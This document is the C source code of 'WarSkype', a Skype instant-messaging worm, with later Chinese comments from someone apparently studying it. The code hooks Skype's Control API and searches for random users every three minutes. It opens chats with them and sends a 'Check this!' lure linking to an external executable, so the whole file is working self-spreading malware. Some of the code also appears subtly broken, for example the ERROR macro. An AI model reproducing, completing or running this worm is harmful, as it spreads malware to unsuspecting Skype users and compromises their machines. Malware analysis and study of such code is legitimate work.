/***********************************************************************************************
 * I saw many IM worms around but nothing using skype. Skype is a nice IM that let you to      *
 * chat or to do VoIP call, so it is possible to use this program like a spreading vector.     *
 * I tried to do direct file transfer but it didn't work so well, so I decided to send url     *
 * to worm to the found users.                                                                 *
 * This is only a demonstration, this is a direct action worm, it will work only if skype      *
 * is installed.                                                                               *
 * Greetz to: SkyOut, Nibble, izee, RadiatioN, berniee, sk0r, psyco_rabbit ... and everybody   *
 * on #vx-lab and #eof-project                                                                 *
 * bye bye ... by WarGame                                                                      *
 ***********************************************************************************************/


#include <windows.h>
#include<stdio.h>
#include<string.h>
 /* Global handlers */
static UINT SkypeAttach;
static UINT SkypeDiscover;
static HWND Answer = NULL;
static HWND SkypeWnd = NULL;
static char rnd_nick[2];

/* generate random nicks to search */
void GetRandNick(void)
{

	char possible_searches[] = "qwertyuiopasdfghjklzxcvbnm";

	srand(GetTickCount());
	//这个srand函数用来给rand函数一个种子，种子不同rand生成的随机数也不同。
	// //GetTickCount函数返回值是程序启动的时间，以s计算
	rnd_nick[0] = possible_searches[rand() % 26];
	rnd_nick[1] = 0;

}

DWORD WINAPI S3arch(LPVOID Data)
{
	char msg[128];
	COPYDATASTRUCT cds;

	/*
	typedef struct tagCOPYDATASTRUCT {
    ULONG_PTR dwData;     //被传递的数据的数据类型的指针，这个应该可以为空
    DWORD cbData;		  //被传递数据的指针
    _Field_size_bytes_(cbData) PVOID lpData;  //要传递数据的大小
	} COPYDATASTRUCT, *PCOPYDATASTRUCT;
	*/


	while (1)
	{
		GetRandNick();
		sprintf(msg, "SEARCH USERS %s", rnd_nick);
		cds.dwData = 0;
		cds.lpData = msg;
		cds.cbData = strlen(msg) + 1;
		if (!SendMessage(SkypeWnd, WM_COPYDATA, (WPARAM)Answer, (LPARAM)&cds))
			//这个应该表示的是向sKypeWnd这个窗口传递信息（应该吧，我猜测的。
		{
			/* skype closed */
			ExitProcess(0);
		}
		Sleep((1000 * 60) * 3); /* every 3 minutes */
	}
}

LRESULT CALLBACK SkypeProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)//这个窗口的调用就有大问题，这就是一个恶意窗口，十分的可恶
{
	PCOPYDATASTRUCT SkypeData = NULL;
	DWORD ThreadID;
	char* found_users = NULL, * chat_cmd = NULL, * chat_id = NULL, msg_cmd[256];
	COPYDATASTRUCT cds;

	if (uMsg == SkypeAttach)
	{
		if (lParam == 0)
		{
			SkypeWnd = (HWND)wParam;
			CreateThread(NULL, 0, &S3arch, 0, 0, &ThreadID);//我感觉这里有问题啊，这里是恶意代码。
		}
	}

	if (uMsg == WM_COPYDATA)
	{
		if (wParam == SkypeWnd)
		{
			SkypeData = (PCOPYDATASTRUCT)lParam;

			if (SkypeData != NULL)
			{

				if (strstr(SkypeData->lpData, "CHAT "))
				{
					strtok(SkypeData->lpData, " ");
					chat_id = strtok(NULL, " ");
					/* this will send the url to everybody :) */
					sprintf(msg_cmd, "CHATMESSAGE %s Check this! http://marx2.altervista.org/surprise.exe", chat_id);

					cds.dwData = 0;
					cds.lpData = msg_cmd;
					cds.cbData = strlen(msg_cmd) + 1;
					SendMessage(SkypeWnd, WM_COPYDATA, Answer, (LPARAM)&cds);//这里是恶意传播，讲这个url恶意传播给其他的窗口
				}

				if (strstr(SkypeData->lpData, "USERS "))
				{
					found_users = (char*)GlobalAlloc(GMEM_ZEROINIT | GMEM_FIXED, 3096);

					if (found_users == NULL)
					{
						ExitProcess(0);
					}

					chat_cmd = (char*)GlobalAlloc(GMEM_ZEROINIT | GMEM_FIXED, 3096 + 128);

					if (chat_cmd == NULL)
					{
						ExitProcess(0);
					}

					strcpy(found_users, (char*)SkypeData->lpData);

					strcpy(found_users, found_users + 6);

					sprintf(chat_cmd, "CHAT CREATE %s", found_users);

					/* contact them :) */
					cds.dwData = 0;
					cds.lpData = chat_cmd;
					cds.cbData = strlen(chat_cmd) + 1;
					SendMessage(SkypeWnd, WM_COPYDATA, Answer, (LPARAM)&cds);//这部分的是为了找到其他用户窗口，把相关的用户信息传递给worm。

					GlobalFree(found_users);
					GlobalFree(chat_cmd);

				}
			}
		}
	}

	DefWindowProc(hWnd, uMsg, wParam, lParam);

	return 1; /* != 0 */
}

void MakeWindow(void)//这一部分是为了创建一个窗口，看起来是创建window窗口事件，而且这个事件是个worm。
{
	WNDCLASS wndcls;

	memset(&wndcls, 0, sizeof(WNDCLASS));

	wndcls.lpszClassName = TEXT("WarSkype by [WarGame,#eof]");
	wndcls.lpfnWndProc = SkypeProc;//这里有问题，我竟然没看到，这里是有问题的，将skypeProc这个调用恶意win窗口的函数搞进去了
	//这导致之后创建的进程都是这个鬼东西的进程。

	if (RegisterClass(&wndcls) == 0)
	{
		ExitProcess(0);
	}

	Answer = CreateWindowEx(0, wndcls.lpszClassName, TEXT("Skype sucks!"), 0, -1, -1, 0, 0,
		(HWND)NULL, (HMENU)NULL, (HINSTANCE)NULL, NULL);

	if (Answer == NULL)
	{
		ExitProcess(0);
	}
}

void RunSkype(void)//这里看起来是要创建一个蠕虫的进程，以保证可以运行它
{
	HKEY hKey;
	char skype_path[MAX_PATH];
	DWORD len = MAX_PATH;
	STARTUPINFO inf_prog;  //Specifies the window station, desktop, standard handles, and appearance of the main window for a process at creation time.
	PROCESS_INFORMATION info_pr; //Contains information about a newly created process and its primary thread
	int user_ret;

#define ERROR MessageBox(NULL,TEXT("I could not find Skype !"),TEXT("Error!"),MB_OK|MB_ICONERROR);
	          ExitProcess(0);

	/* path of skype in registry */
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Skype\\Phone"), 0,
		KEY_QUERY_VALUE, &hKey) != ERROR_SUCCESS)
	{
		ERROR
	}

	if (RegQueryValueEx(hKey, TEXT("SkypePath"), 0, NULL, (LPBYTE)skype_path,
		&len) != ERROR_SUCCESS)
	{
		ERROR
	}

	RegCloseKey(hKey);

	memset(&inf_prog, 0, sizeof(STARTUPINFO));
	memset(&info_pr, 0, sizeof(PROCESS_INFORMATION));

	inf_prog.cb = sizeof(STARTUPINFO);
	inf_prog.dwFlags = STARTF_USESHOWWINDOW;
	inf_prog.wShowWindow = SW_SHOW;

	if (CreateProcess(NULL, (LPWSTR)skype_path, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL,
		NULL, &inf_prog, &info_pr))
	{
		MessageBox(NULL, TEXT("Allow this program in skype!"), TEXT("Warning!")
			, MB_OK | MB_ICONWARNING);
	}

	else
	{
		ERROR
	}
}

int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	MSG oMessage;
	SkypeAttach = RegisterWindowMessage(TEXT("SkypeControlAPIAttach"));
	SkypeDiscover = RegisterWindowMessage(TEXT("SkypeControlAPIDiscover"));

	RunSkype(); /* (try to) run skype */

	if (SkypeAttach != 0 && SkypeDiscover != 0)
	{
		MakeWindow(); /* Create window */
		SendMessage(HWND_BROADCAST, SkypeDiscover, (WPARAM)Answer, 0);

		while (GetMessage(&oMessage, 0, 0, 0) != FALSE)
		{
			TranslateMessage(&oMessage);
			DispatchMessage(&oMessage);
		}


	}

}